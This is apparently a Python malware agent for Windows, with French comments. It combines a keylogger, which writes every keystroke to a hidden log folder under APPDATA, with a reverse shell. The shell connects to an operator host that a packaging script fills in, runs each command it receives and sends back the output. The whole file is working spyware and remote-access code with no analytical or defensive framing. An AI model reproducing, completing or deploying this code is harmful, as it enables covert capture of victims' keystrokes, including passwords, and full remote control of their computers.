import socket
import subprocess
import threading
import os
import sys
import logging
from pynput import keyboard

# 📁 Chemins des logs
LOG_DIR = os.path.join(os.getenv("APPDATA") or "C:\\Users\\Public", "win_logs")
KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
os.makedirs(LOG_DIR, exist_ok=True)

# 📝 Logger local (debug)
logging.basicConfig(
    filename=os.path.join(LOG_DIR, "agent_debug.log"),
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# 🐍 Fonction reverse shell (placeholders remplacés par packager.py)
def reverse_shell(host=LHOST_PLACEHOLDER, port=LPORT_PLACEHOLDER):
    try:
        logging.info(f"Tentative de connexion à {host}:{port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"[+] Agent connecté depuis Windows\n")
        logging.info("Connexion reverse shell établie")
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() in ["exit", "quit"]:
                break
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            s.send(output)
        s.close()
    except Exception as e:
        logging.error(f"Erreur reverse_shell: {e}")

# ⌨️ Fonction keylogger (local)
def start_keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{key}]")
        except Exception as e:
            logging.error(f"Erreur lors de l'enregistrement de frappe : {e}")

    try:
        logging.info("Keylogger démarré")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
    except Exception as e:
        logging.error(f"Erreur keylogger: {e}")

# 🚀 Point d’entrée
if __name__ == "__main__":
    threading.Thread(target=start_keylogger, daemon=True).start()
    reverse_shell()
